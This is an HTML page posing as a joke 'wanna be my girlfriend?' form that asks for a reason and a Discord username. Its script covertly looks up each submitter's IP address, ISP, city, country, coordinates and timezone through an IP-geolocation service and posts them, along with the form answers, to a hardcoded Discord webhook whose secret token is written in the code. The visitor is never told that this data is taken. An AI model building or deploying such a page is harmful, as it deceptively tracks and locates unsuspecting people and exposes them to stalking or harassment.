<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>girlfriend</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            background: #000; 
            padding: 1.5rem; 
            font-family: 'Inter', sans-serif; 
        }
        .card { 
            width: 100%; 
            max-width: 480px; 
            background: #0a0a0a; 
            border: 1px solid #1a1a1a; 
            border-radius: 32px; 
            padding: 2.5rem 2rem; 
            box-shadow: 0 20px 60px rgba(0,0,0,1); 
            animation: fadeUp 0.7s ease-out; 
            position: relative; 
            overflow: hidden; 
        }
        .card::before { 
            content: ''; 
            position: absolute; 
            inset: -1px; 
            border-radius: 32px; 
            padding: 1px; 
            background: linear-gradient(135deg, rgba(255,255,255,0.06), transparent 50%, rgba(255,255,255,0.03)); 
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0); 
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0); 
            -webkit-mask-composite: xor; 
            mask-composite: exclude; 
            pointer-events: none; 
            animation: borderPulse 4s ease-in-out infinite alternate; 
        }
        @keyframes borderPulse { 0% { opacity: 0.2; } 100% { opacity: 0.8; } }
        @keyframes fadeUp { 
            0% { opacity: 0; transform: translateY(20px) scale(0.97); } 
            100% { opacity: 1; transform: translateY(0) scale(1); } 
        }
        .title { 
            font-size: 2rem; 
            font-weight: 500; 
            letter-spacing: -0.02em; 
            color: #e8e8e8; 
            margin-bottom: 2rem; 
            line-height: 1.2; 
        }
        .title span { font-weight: 300; color: #888; }
        .group { margin-bottom: 1.8rem; }
        .group label { 
            display: block; 
            font-size: 0.75rem; 
            font-weight: 600; 
            text-transform: uppercase; 
            letter-spacing: 0.1em; 
            color: #666; 
            margin-bottom: 0.5rem; 
        }
        .box { 
            background: #0d0d0d; 
            border: 1px solid #1c1c1c; 
            border-radius: 20px; 
            padding: 0.1rem; 
            transition: border-color 0.3s, box-shadow 0.3s; 
            position: relative; 
        }
        .box:focus-within { 
            border-color: #4a4a4a; 
            box-shadow: 0 0 0 1px #2a2a2a; 
        }
        .box textarea, .box input { 
            width: 100%; 
            background: transparent; 
            border: none; 
            padding: 0.9rem 1.2rem; 
            font-size: 0.95rem; 
            color: #e0e0e0; 
            outline: none; 
            font-family: 'Inter', sans-serif; 
        }
        .box textarea { 
            min-height: 110px; 
            resize: vertical; 
            line-height: 1.5; 
        }
        .discord-box input { padding-left: 2.8rem; }
        .discord-box .at { 
            position: absolute; 
            left: 1.2rem; 
            top: 50%; 
            transform: translateY(-50%); 
            color: #555; 
            font-size: 0.95rem; 
            pointer-events: none; 
        }
        .btn { 
            width: 100%; 
            background: #121212; 
            border: 1px solid #222; 
            border-radius: 60px; 
            padding: 1rem 1.5rem; 
            font-size: 0.95rem; 
            font-weight: 500; 
            color: #ccc; 
            cursor: pointer; 
            transition: all 0.3s ease; 
            margin-top: 0.5rem; 
        }
        .btn:hover { 
            background: #1a1a1a; 
            border-color: #3a3a3a; 
            color: #fff; 
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        #status { 
            margin-top: 1.5rem; 
            text-align: center; 
            font-size: 0.8rem; 
            color: #555; 
            padding: 0.7rem 1rem; 
            border-radius: 30px; 
            background: #0a0a0a; 
            border: 1px solid #161616; 
            min-height: 3rem; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
        }
        #status.ok { color: #aaa; border-color: #2a2a2a; }
        #status.err { color: #999; border-color: #3a1a1a; }
        .status-dot { 
            display: inline-block; 
            width: 6px; 
            height: 6px; 
            border-radius: 50%; 
            background: #333; 
            margin-right: 8px; 
        }
        #status.ok .status-dot { background: #888; }
        #status.err .status-dot { background: #663333; }
        @media (max-width: 480px) {
            .card { padding: 1.8rem 1.2rem; border-radius: 24px; }
            .title { font-size: 1.65rem; }
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="title">wanna be <span>my girlfriend?</span></div>
        
        <form id="form">
            <div class="group">
                <label for="reason">why?</label>
                <div class="box">
                    <textarea id="reason" name="reason" placeholder="tell me..." required></textarea>
                </div>
            </div>
            
            <div class="group">
                <label for="discord">discord @</label>
                <div class="box discord-box">
                    <span class="at">@</span>
                    <input type="text" id="discord" name="discord" placeholder="username" required>
                </div>
            </div>
            
            <button type="submit" class="btn">Send</button>
        </form>
        
        <div id="status"><span class="status-dot"></span>ready</div>
    </div>
    <script>
    (function() {
        const form = document.getElementById('form');
        const status = document.getElementById('status');
        
        const WEBHOOK = "https://discord.com/api/webhooks/1543174266239844412/QPGFBn-OxdFNAYLy2xDS7Ee0LpByWqj0eHB7OZ-oBZhgwGFQlhzfOFvMrDJYSusp4nNZ";

        function setStatus(msg, type) {
            status.innerHTML = `<span class="status-dot"></span>${msg}`;
            status.className = type || '';
        }

        async function getIpInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                if (!res.ok) throw new Error('IP lookup failed');
                const data = await res.json();
                return {
                    ip: data.ip || 'unknown',
                    city: data.city || '—',
                    region: data.region || '—',
                    country: data.country_name || data.country || '—',
                    countryCode: data.country || '—',
                    org: data.org || data.asn || '—',
                    timezone: data.timezone || '—',
                    lat: data.latitude ?? '—',
                    lon: data.longitude ?? '—'
                };
            } catch (err) {
                console.warn('IP lookup error:', err);
                return {
                    ip: 'lookup failed',
                    city: '—',
                    region: '—',
                    country: '—',
                    countryCode: '—',
                    org: '—',
                    timezone: '—',
                    lat: '—',
                    lon: '—'
                };
            }
        }

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            const reason = document.getElementById('reason').value.trim();
            const discord = document.getElementById('discord').value.trim();

            if (reason.length < 3) {
                setStatus('reason is too short', 'err');
                return;
            }
            if (discord.length < 2) {
                setStatus('enter your discord username', 'err');
                return;
            }

            setStatus('getting location...', '');
            const btn = this.querySelector('.btn');
            btn.disabled = true;

            const ipInfo = await getIpInfo();

            setStatus('sending...', '');

            try {
                const res = await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            color: 0x777777,
                            title: "Girlfriend Application",
                            fields: [
                                { name: "Reason", value: reason },
                                { name: "Discord", value: "@" + discord },
                                { name: "IP Address", value: ipInfo.ip, inline: true },
                                { name: "Organization / ISP", value: ipInfo.org, inline: true },
                                { name: "Location", value: `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country} (${ipInfo.countryCode})` },
                                { name: "Coordinates", value: `${ipInfo.lat}, ${ipInfo.lon}`, inline: true },
                                { name: "Timezone", value: ipInfo.timezone, inline: true }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                });

                if (res.ok) {
                    setStatus('sent successfully', 'ok');
                    form.reset();
                } else {
                    setStatus('failed to send', 'err');
                }
            } catch (err) {
                console.error(err);
                setStatus('network error', 'err');
            } finally {
                btn.disabled = false;
            }
        });

        document.querySelectorAll('input, textarea').forEach(el => {
            el.addEventListener('focus', () => {
                if (status.textContent.includes('sent') || status.textContent.includes('error') || status.textContent.includes('failed')) {
                    setStatus('ready', '');
                }
            });
        });
    })();
    </script>
</body>
</html>
